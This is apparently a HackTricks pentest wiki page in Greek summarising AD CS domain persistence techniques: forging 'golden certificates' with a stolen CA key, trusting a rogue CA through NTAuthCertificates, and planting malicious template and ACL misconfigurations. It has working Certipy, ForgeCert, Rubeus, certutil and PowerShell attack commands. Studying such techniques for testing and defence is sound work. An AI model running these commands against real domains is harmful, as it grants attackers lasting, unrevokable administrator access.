# AD CS Domain Persistence

{{#include ../../../banners/hacktricks-training.md}}

**Αυτό είναι μια περίληψη των domain persistence τεχνικών που κοινοποιούνται στο [https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)**. Δες το για περισσότερες λεπτομέρειες.

## Forging Certificates with Stolen CA Certificates (Golden Certificate) - DPERSIST1

How can you tell that a certificate is a CA certificate?

Μπορεί να διαπιστωθεί ότι ένα πιστοποιητικό είναι CA certificate εάν πληρούνται αρκετές προϋποθέσεις:

- Το πιστοποιητικό αποθηκεύεται στον CA server, με το ιδιωτικό του κλειδί προστατευμένο από το DPAPI της μηχανής, ή από hardware όπως TPM/HSM εάν το λειτουργικό σύστημα το υποστηρίζει.
- Τα πεδία Issuer και Subject του πιστοποιητικού ταιριάζουν με το distinguished name του CA.
- Μια επέκταση "CA Version" υπάρχει αποκλειστικά στα CA certificates.
- Το πιστοποιητικό δεν έχει πεδία Extended Key Usage (EKU).

Για την εξαγωγή του ιδιωτικού κλειδιού αυτού του πιστοποιητικού, το εργαλείο `certsrv.msc` στον CA server είναι ο υποστηριζόμενος τρόπος μέσω του ενσωματωμένου GUI. Παρ' όλα αυτά, αυτό το πιστοποιητικό δεν διαφέρει από άλλα που αποθηκεύονται στο σύστημα· επομένως, μέθοδοι όπως η [THEFT2 technique](certificate-theft.md#user-certificate-theft-via-dpapi-theft2) μπορούν να εφαρμοστούν για εξαγωγή.

Το πιστοποιητικό και το ιδιωτικό κλειδί μπορούν επίσης να αποκτηθούν χρησιμοποιώντας το Certipy με την ακόλουθη εντολή:
```bash
certipy ca 'corp.local/administrator@ca.corp.local' -hashes :123123.. -backup
```
Μετά την απόκτηση του πιστοποιητικού CA και του ιδιωτικού του κλειδιού σε μορφή `.pfx`, εργαλεία όπως [ForgeCert](https://github.com/GhostPack/ForgeCert) μπορούν να χρησιμοποιηθούν για να δημιουργήσουν έγκυρα πιστοποιητικά:
```bash
# Generating a new certificate with ForgeCert
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123! --Subject "CN=User" --SubjectAltName localadmin@theshire.local --NewCertPath localadmin.pfx --NewCertPassword Password123!

# Generating a new certificate with certipy
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local -subject 'CN=Administrator,CN=Users,DC=CORP,DC=LOCAL'

# Authenticating using the new certificate with Rubeus
Rubeus.exe asktgt /user:localdomain /certificate:C:\ForgeCert\localadmin.pfx /password:Password123!

# Authenticating using the new certificate with certipy
certipy auth -pfx administrator_forged.pfx -dc-ip 172.16.126.128
```
> [!WARNING]
> Ο χρήστης που στοχεύεται για την πλαστογράφηση πιστοποιητικού πρέπει να είναι ενεργός και ικανός να αυθεντικοποιηθεί στο Active Directory ώστε η διαδικασία να ευοδωθεί. Η πλαστογράφηση πιστοποιητικού για ειδικούς λογαριασμούς όπως ο krbtgt είναι αναποτελεσματική.

Αυτό το πλαστογραφημένο πιστοποιητικό θα είναι **έγκυρο** έως την καθορισμένη ημερομηνία λήξης και για όσο χρόνο το ριζικό πιστοποιητικό της CA είναι **έγκυρο** (συνήθως από 5 έως **10+ χρόνια**). Είναι επίσης έγκυρο για **μηχανήματα**, οπότε σε συνδυασμό με το **S4U2Self**, ένας επιτιθέμενος μπορεί να **διατηρήσει persistence σε οποιαδήποτε domain μηχανή** για όσο διαρκεί η ισχύς του πιστοποιητικού της CA.\
Επιπλέον, τα **πιστοποιητικά που δημιουργούνται** με αυτή τη μέθοδο **δεν μπορούν να ανακληθούν**, καθώς η CA δεν είναι ενήμερη γι' αυτά.

### Operating under Strong Certificate Mapping Enforcement (2025+)

Από τις 11 Φεβρουαρίου 2025 (μετά την κυκλοφορία του KB5014754), οι domain controllers έχουν ως προεπιλογή το **Full Enforcement** για τα certificate mappings. Στην πράξη αυτό σημαίνει ότι τα πλαστογραφημένα πιστοποιητικά σας πρέπει είτε:

- Να περιέχουν έναν ισχυρό δεσμό με τον στοχευόμενο λογαριασμό (για παράδειγμα, την SID security extension), ή
- Να συνοδεύονται από ένα ισχυρό, ρητό mapping στο `altSecurityIdentities` attribute του στοχευόμενου αντικειμένου.

Μια αξιόπιστη προσέγγιση για persistence είναι να δημιουργηθεί ένα πλαστογραφημένο πιστοποιητικό συνδεδεμένο στην κλεμμένη Enterprise CA και στη συνέχεια να προστεθεί ένα ισχυρό, ρητό mapping στον θύμα principal:
```powershell
# Example: map a forged cert to a target account using Issuer+Serial (strong mapping)
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'           # reverse DN format expected by AD
$SerialR = '1200000000AC11000000002B'                  # serial in reversed byte order
$Map     = "X509:<I>$Issuer<SR>$SerialR"             # strong mapping format
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Σημειώσεις
- Εάν μπορείτε να κατασκευάσετε forged certificates που περιλαμβάνουν την επέκταση ασφάλειας SID, αυτά θα αντιστοιχιστούν έμμεσα ακόμα και υπό Full Enforcement. Διαφορετικά, προτιμήστε ρητές ισχυρές αντιστοιχίσεις. Δείτε [account-persistence](account-persistence.md) για περισσότερα σχετικά με ρητές αντιστοιχίσεις.
- Η ανάκληση δεν βοηθά τους αμυνόμενους εδώ: τα forged certificates είναι άγνωστα στη CA database και επομένως δεν μπορούν να ανακληθούν.

## Εμπιστοσύνη σε μη αξιόπιστα πιστοποιητικά CA - DPERSIST2

Το αντικείμενο `NTAuthCertificates` έχει οριστεί να περιέχει ένα ή περισσότερα **πιστοποιητικά CA** μέσα στο attribute `cacertificate`, που αξιοποιεί το Active Directory (AD). Η διαδικασία επαλήθευσης από τον **domain controller** περιλαμβάνει έλεγχο του αντικειμένου `NTAuthCertificates` για μια εγγραφή που ταιριάζει με την **CA που αναφέρεται** στο πεδίο Issuer του πιστοποιητικού που πραγματοποιεί την αυθεντικοποίηση. Η αυθεντικοποίηση προχωρά εάν βρεθεί ταύτιση.

Ένα αυτο-υπογεγραμμένο πιστοποιητικό CA μπορεί να προστεθεί στο αντικείμενο `NTAuthCertificates` από έναν επιτιθέμενο, εφόσον έχει έλεγχο αυτού του αντικειμένου AD. Κανονικά, μόνο μέλη της ομάδας **Enterprise Admin**, καθώς και των **Domain Admins** ή των **Administrators** στο domain ρίζας του forest, έχουν άδεια να τροποποιήσουν αυτό το αντικείμενο. Μπορούν να επεξεργαστούν το αντικείμενο `NTAuthCertificates` χρησιμοποιώντας `certutil.exe` με την εντολή `certutil.exe -dspublish -f C:\Temp\CERT.crt NTAuthCA`, ή με τη χρήση του [**PKI Health Tool**](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/import-third-party-ca-to-enterprise-ntauth-store#method-1---import-a-certificate-by-using-the-pki-health-tool).

Επιπλέον χρήσιμες εντολές για αυτήν την τεχνική:
```bash
# Add/remove and inspect the Enterprise NTAuth store
certutil -enterprise -f -AddStore NTAuth C:\Temp\CERT.crt
certutil -enterprise -viewstore NTAuth
certutil -enterprise -delstore NTAuth <Thumbprint>

# (Optional) publish into AD CA containers to improve chain building across the forest
certutil -dspublish -f C:\Temp\CERT.crt RootCA          # CN=Certification Authorities
certutil -dspublish -f C:\Temp\CERT.crt CA               # CN=AIA
```
Αυτή η δυνατότητα είναι ιδιαίτερα σχετική όταν χρησιμοποιείται σε συνδυασμό με μια προηγουμένως περιγραφείσα μέθοδο που περιλαμβάνει το ForgeCert για τη δυναμική δημιουργία πιστοποιητικών.

> Post-2025 mapping considerations: placing a rogue CA in NTAuth only establishes trust in the issuing CA. To use leaf certificates for logon when DCs are in **Full Enforcement**, the leaf must either contain the SID security extension or there must be a strong explicit mapping on the target object (for example, Issuer+Serial in `altSecurityIdentities`). See {{#ref}}account-persistence.md{{#endref}}.

## Κακόβουλη κακοδιαμόρφωση - DPERSIST3

Υπάρχουν πολλές ευκαιρίες για **persistence** μέσω τροποποιήσεων security descriptor των συστατικών του AD CS. Τροποποιήσεις που περιγράφονται στην ενότητα "[Domain Escalation](domain-escalation.md)" μπορούν να υλοποιηθούν κακόβουλα από έναν attacker με αυξημένη πρόσβαση. Αυτό περιλαμβάνει την προσθήκη "control rights" (π.χ., WriteOwner/WriteDACL/etc.) σε ευαίσθητα συστατικά όπως:

- Το αντικείμενο **AD computer** του **CA server**
- Ο **RPC/DCOM server** του **CA server**
- Οποιοδήποτε **descendant AD object or container** μέσα στο **`CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`** (για παράδειγμα, το Certificate Templates container, Certification Authorities container, το αντικείμενο NTAuthCertificates, κ.λπ.)
- **AD groups delegated rights to control AD CS** από προεπιλογή ή από τον οργανισμό (όπως η ενσωματωμένη ομάδα Cert Publishers και τα μέλη της)

Ένα παράδειγμα κακόβουλης υλοποίησης θα περιλάμβανε έναν επιτιθέμενο, ο οποίος έχει αυξημένα permissions στο domain, να προσθέτει την άδεια **`WriteOwner`** στο προεπιλεγμένο πρότυπο πιστοποιητικού **`User`**, με τον επιτιθέμενο να είναι ο principal για το δικαίωμα. Για να το εκμεταλλευτεί, ο επιτιθέμενος θα άλλαζε πρώτα την ιδιοκτησία του προτύπου **`User`** στον εαυτό του. Στη συνέχεια, το **`mspki-certificate-name-flag`** θα οριζόταν στο **1** στο πρότυπο για να ενεργοποιηθεί το **`ENROLLEE_SUPPLIES_SUBJECT`**, επιτρέποντας σε έναν χρήστη να παρέχει ένα Subject Alternative Name στο αίτημα. Κατόπιν, ο επιτιθέμενος θα μπορούσε να **enroll** χρησιμοποιώντας το πρότυπο, επιλέγοντας ένα όνομα domain administrator ως alternative name, και να χρησιμοποιήσει το αποκτηθέν πιστοποιητικό για authentication ως ο DA.

Πρακτικές ρυθμίσεις που μπορεί να θέσει ένας επιτιθέμενος για μακροπρόθεσμη persistence στο domain (βλ. {{#ref}}domain-escalation.md{{#endref}} για πλήρεις λεπτομέρειες και ανίχνευση):

- Σημαίες πολιτικής CA που επιτρέπουν SAN από τους requesters (π.χ., ενεργοποίηση του `EDITF_ATTRIBUTESUBJECTALTNAME2`). Αυτό διατηρεί διαδρομές τύπου ESC1 εκμεταλλεύσιμες.
- DACL προτύπου ή ρυθμίσεις που επιτρέπουν έκδοση ικανή για authentication (π.χ., προσθήκη Client Authentication EKU, ενεργοποίηση του `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`).
- Έλεγχος του αντικειμένου `NTAuthCertificates` ή των CA containers για συνεχή επανεισαγωγή rogue issuers εάν οι defenders επιχειρήσουν καθαρισμό.

> [!TIP]
> Σε περιβάλλοντα με hardening μετά το KB5014754, ο συνδυασμός αυτών των misconfigurations με ρητές ισχυρές mappings (`altSecurityIdentities`) εξασφαλίζει ότι τα εκδοθέντα ή πλαστά πιστοποιητικά παραμένουν χρήσιμα ακόμη και όταν οι DCs επιβάλουν strong mapping.



## References

- Microsoft KB5014754 – Certificate-based authentication changes on Windows domain controllers (enforcement timeline and strong mappings). https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16
- Certipy – Command Reference and forge/auth usage. https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference
- [0xdf – HTB: Certificate (SeManageVolumePrivilege to exfil CA keys → Golden Certificate)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)

{{#include ../../../banners/hacktricks-training.md}}
